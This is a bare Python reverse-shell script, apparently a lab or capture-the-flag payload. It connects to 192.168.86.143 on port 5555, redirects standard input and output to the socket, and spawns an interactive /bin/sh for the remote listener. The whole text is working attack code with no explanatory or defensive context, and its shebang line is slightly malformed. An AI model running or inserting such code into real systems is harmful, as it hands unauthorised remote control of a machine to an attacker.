#! # /usr/bin/env python3
import socket,os,pty
s=socket.socket()
s.connect(("192.168.86.143",5555))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
